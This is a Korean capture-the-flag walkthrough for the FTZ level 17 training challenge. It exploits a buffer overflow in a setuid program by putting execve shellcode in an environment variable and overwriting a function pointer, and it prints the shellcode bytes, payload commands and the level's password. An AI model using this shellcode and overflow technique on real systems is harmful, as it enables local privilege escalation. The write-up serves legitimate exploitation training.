# FTZ 17  
## 문제 설명  
attackme 프로그램을 공격하자. attackme 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.  
```
#include <stdio.h>

void printit() {
  printf("Hello there!\n");
}

main()
{
  int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```  
attackme 파일의 소유자는 level18이다. => setreuid(3098,3098) 코드때문에 그렇다!  
buf는 20 byte인데 fgets(buf, 48, stdin);에서 48byte나 읽어들여오니 bof 공격을 수행하면 되겠다!  
call 함수 포인터에 printit가 아니라 쉘 코드를 실행하는 payload 주소를 넣어주면 될 것 같다!  

## 문제 풀이  

1. gdb로 스택 구조를 파악하자!  
<img width="303" alt="1" src="https://user-images.githubusercontent.com/46364778/89731868-91369380-da85-11ea-99f2-ef99fb1a2456.PNG">  

* ```sub esp, 0x38``` : 0x38=56byte 크기를 스택에 할당한다.  
* ```mov DWORD PTR [ebp-16], 0x8048490```  
```mov eax, DWORD PTR [ebp-16]```  
```call eax```: ebp-16 위치에는 call 함수 포인터가 있고 0x8048490은 printit 함수의 주소인 것 같다.  

* ```lea eax, [ebp-56]```  
```push eax```  
```call <fgets>``` : buf에 56byte를 할당하고 fgets 함수를 통해 버퍼를 채운다!  
그럼 스택구조는 아래와 같다! ~~정확한 dummy파악은 어케 하는지 알지?ㅎ..~~  

|ret [4]|
|:---:|
|sfp [4]|
|dummy [8]|
|crap [4]|
|call [4]|
|dummy [20]|
|buf [20]|

2. 스택 구조 파악했으니 이제 call에 공격 payload의 주소를 넣어주면 된다!  
그러기위해 공격 payload를 환경변수에 넣자.  
```
export SHELL=$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')
```  

그리고 환경변수의 주소를 얻자.  
```
// getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[1]){
	printf("address = %p\n", getenv("SHELL"););
}
```  

```
gcc -o getenv getenv.c
./getenv
```  

```address = 0xbffffbde``` 라는 결과를 얻을 수 있다.  

3. 이제 공격을 해보자!  
40byte를 아무값이나 채우고 call 포인터 변수에 환경변수 주소값을 넣으면 된다!  

```
(python -c 'print "\x90"*40 + "\xde\xfb\xff\xbf"'; cat) | ./attackme
```  

4. level18의 비밀번호는 "why did you do it"  

### 외전  
다른 공격기법으로 할 수 있을까?  
```fgets(buf,48,stdin);```
**48byte밖에 공격이 안되기 때문에 RTL을 이용하는 공격은 불가능하다!**  
환경변수를 이용한 공격은 /bin/sh(4)밖에 소모되지 않지만, RTL 공격은 system(4) + exit(4) + /bin/sh(4) 총 12byte나 소모되기 때문이다.  

## 그 외  
